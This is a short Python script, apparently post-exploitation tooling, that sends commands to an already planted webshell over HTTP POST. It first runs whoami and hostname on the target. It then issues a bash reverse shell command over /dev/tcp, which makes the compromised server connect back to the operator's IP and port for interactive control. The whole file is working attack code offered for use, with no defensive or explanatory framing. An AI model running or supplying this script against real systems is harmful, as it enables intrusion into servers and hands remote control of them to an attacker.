import requests
import json
import sys
import socket

webshell_url = ""

local_ip = socket.gethostbyname(socket.gethostname())
local_port = 9001

if len(sys.argv) >= 2:
	local_ip = sys.argv[1]

if len(sys.argv) >= 3:
	local_port = sys.argv[2]

def send_cmd(cmd):
	result = requests.post(url = webshell_url, data = {'comando':cmd}, timeout=None)
	return json.loads(result.text)['valor']

whoami = send_cmd('whoami').replace('\n','')
hostname = send_cmd('hostname').replace('\n','')

try:
	print(f'Sending reverse shell from {whoami}@{hostname} to {local_ip}:{local_port} ...')
	send_cmd(f'bash -c "bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1"')
except KeyboardInterrupt:
	print('\nReverse shell terminated.')
	exit()